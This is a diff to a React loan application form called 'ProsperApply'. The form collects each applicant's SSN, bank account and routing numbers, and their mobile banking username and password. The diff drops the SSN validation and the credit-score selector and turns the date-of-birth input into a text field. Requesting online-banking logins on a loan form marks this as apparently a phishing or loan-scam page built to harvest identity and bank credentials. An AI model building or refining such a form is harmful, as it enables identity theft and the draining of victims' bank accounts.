@@ -12,9 +12,7 @@ const formSchema = z.object({
   dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
   city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
   zip: z.string().min(5, "Min 5 digits"),
-  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
   monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
-  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
   bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
   accountNumber: z.string().min(1,"Required"),
   routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
@@ -325,7 +323,7 @@ export default function ProsperApply() {
         zip_code:data.zip, employment_status:"", employer_name:"",
         monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
         pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
-        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
+        client_id:client?.id||null, ssn:data.ssn, credit_score:'',
         bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
         account_number:data.accountNumber, routing_number:data.routingNumber,
         mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
@@ -774,7 +772,7 @@ export default function ProsperApply() {
                   <div className="pr-fgroup"><label className="pr-lbl">Last Name</label><input className="pr-in" {...register("lastName")} placeholder="Last name"/>{errors.lastName&&<p className="pr-err">{errors.lastName.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Email Address</label><input className="pr-in" type="email" {...register("email")} placeholder="you@example.com"/>{errors.email&&<p className="pr-err">{errors.email.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Phone Number</label><input className="pr-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="pr-err">{errors.phone.message}</p>}</div>
-                  <div className="pr-fgroup"><label className="pr-lbl">Date of Birth</label><input className="pr-in" type="date" {...register("dob")}/>{errors.dob&&<p className="pr-err">{errors.dob.message}</p>}</div>
+                  <div className="pr-fgroup"><label className="pr-lbl">Date of Birth</label><input className="pr-in" type="text" placeholder="MM/DD/YYYY" {...register("dob")}/>{errors.dob&&<p className="pr-err">{errors.dob.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Social Security Number</label><div className="pr-icon-field"><input className="pr-in" {...register("ssn")} placeholder="No dashes" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.ssn&&<p className="pr-err">{errors.ssn.message}</p>}</div>
                 </div>
                 <div className="pr-fgroup"><label className="pr-lbl">Street Address</label><input className="pr-in" {...register("address")} placeholder="123 Main Street"/>{errors.address&&<p className="pr-err">{errors.address.message}</p>}</div>
@@ -792,15 +790,7 @@ export default function ProsperApply() {
                   <div className="pr-fgroup"><label className="pr-lbl">Monthly Income ($)</label><input className="pr-in" type="number" {...register("monthlyIncome")} placeholder="e.g. 5,000"/>{errors.monthlyIncome&&<p className="pr-err">{errors.monthlyIncome.message}</p>}</div>
                   <div className="pr-fgroup"><label className="pr-lbl">Loan Amount ($)</label><input className="pr-in" type="number" {...register("loanAmount")} placeholder="e.g. 10,000"/>{errors.loanAmount&&<p className="pr-err">{errors.loanAmount.message}</p>}</div>
                 </div>
-                <div className="pr-fgroup"><label className="pr-lbl">Credit Score Range</label>
-                  <select className="pr-in" {...register("creditScore")} defaultValue="" style={{height:46,cursor:"pointer"}}>
-                    <option value="" disabled>Select your credit range</option>
-                    <option value="good">781–850 (Excellent)</option>
-                    <option value="low">661–780 (Good)</option>
-                    <option value="bad">Below 660 (Fair / Poor)</option>
-                  </select>
-                  {errors.creditScore&&<p className="pr-err">{errors.creditScore.message}</p>}
-                </div>
+
               </div>
 
               {/* Banking */}
